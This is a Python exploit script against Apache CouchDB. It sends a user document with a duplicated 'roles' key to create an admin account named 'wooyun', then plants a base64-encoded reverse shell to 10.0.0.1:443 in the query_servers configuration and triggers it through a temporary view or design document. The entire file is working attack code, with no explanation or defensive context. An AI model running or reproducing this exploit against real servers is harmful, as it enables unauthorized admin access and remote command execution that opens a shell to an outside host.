#!/usr/bin/env python3
import base64
import json

import requests
from requests.auth import HTTPBasicAuth

target = "http://your-ip:5984"
command = rb"""sh -i >& /dev/tcp/10.0.0.1/443 0>&1"""
version = 1

session = requests.session()
session.headers = {"Content-Type": "application/json"}
# session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
session.put(
    target + "/_users/org.couchdb.user:wooyun",
    data="""{
  "type": "user",
  "name": "wooyun",
  "roles": ["_admin"],
  "roles": [],
  "password": "wooyun"
}""",
)

session.auth = HTTPBasicAuth("wooyun", "wooyun")

command = (
    "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
)
if version == 1:
    session.put(target + ("/_config/query_servers/cmd"), data=json.dumps(command))
else:
    host = session.get(target + "/_membership").json()["all_nodes"][0]
    session.put(
        target + f"/_node/{host}/_config/query_servers/cmd", data=json.dumps(command)
    )

session.put(target + "/wooyun")
session.put(target + "/wooyun/test", data='{"_id": "wooyuntest"}')

if version == 1:
    session.post(
        target + "/wooyun/_temp_view?limit=10", data='{"language":"cmd","map":""}'
    )
else:
    session.put(
        target + "/wooyun/_design/test",
        data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}',
    )

